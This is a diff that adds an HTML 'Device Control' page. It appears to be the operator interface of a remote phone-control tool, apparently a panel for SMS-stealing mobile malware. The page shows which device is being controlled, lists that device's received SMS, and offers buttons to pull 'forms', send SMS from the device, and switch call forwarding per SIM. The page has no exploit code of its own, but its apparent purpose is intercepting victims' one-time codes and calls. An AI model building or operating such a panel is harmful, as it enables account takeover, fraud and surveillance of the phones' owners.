@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Control</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="main-header device-header">
+        <i class="fa-solid fa-arrow-left back-btn" onclick="window.location.href='index.html'"></i>
+        <h2>Device Control</h2>
+        <span class="status-dot online"></span>
+    </header>
+
+    <div class="controlling-info">
+        <i class="fa-solid fa-mobile-screen"></i> Controlling: <span id="current-device-id">...</span>
+    </div>
+
+    <div class="device-actions">
+        <button class="gradient-btn telegram-btn" id="btn-get-forms">GET FORMS</button>
+        <button class="gradient-btn telegram-btn" onclick="openModal('sms-modal')">SEND SMS</button>
+    </div>
+    <div class="device-actions-full">
+        <button class="gradient-btn full-btn update-btn" onclick="openModal('forwarding-device-modal')">CALL FORWARDING</button>
+    </div>
+
+    <h3 class="section-title">Received SMS</h3>
+    <main id="sms-list" class="sms-list">
+        <!-- SMS will be injected here via JS -->
+    </main>
+
+    <!-- SMS Modal -->
+    <div id="sms-modal" class="modal">
+        <div class="modal-content sms-modal-content">
+            <h2>Send SMS Command</h2>
+            <div class="input-group">
+                <input type="text" id="sms-phone" placeholder="Phone Number">
+            </div>
+            <div class="input-group">
+                <textarea id="sms-body" placeholder="SMS Message" rows="4"></textarea>
+            </div>
+            <div class="radio-group">
+                <label>
+                    <input type="radio" name="sms-sim" value="sim1" checked> 
+                    <span>SIM 1</span>
+                </label>
+                <label>
+                    <input type="radio" name="sms-sim" value="sim2"> 
+                    <span>SIM 2</span>
+                </label>
+            </div>
+            <div class="modal-actions-full">
+                <button class="gradient-btn telegram-btn full-btn" id="send-sms-btn">SEND SMS</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Call Forwarding Modal -->
+    <div id="forwarding-device-modal" class="modal">
+        <div class="modal-content sms-modal-content">
+            <h2>Call Forwarding</h2>
+            <div class="input-group">
+                <input type="text" id="dev-fw-number" placeholder="Forwarding Number">
+            </div>
+            <div class="radio-group">
+                <label>
+                    <input type="radio" name="fw-sim" value="sim1" checked> 
+                    <span>SIM 1</span>
+                </label>
+                <label>
+                    <input type="radio" name="fw-sim" value="sim2"> 
+                    <span>SIM 2</span>
+                </label>
+            </div>
+            <div class="modal-actions-full">
+                <button class="gradient-btn telegram-btn full-btn" id="activate-fw-btn">ACTIVATE</button>
+                <button class="gradient-btn telegram-btn full-btn" id="deactivate-fw-btn">DEACTIVATE</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="device.js"></script>
+</body>
+</html>
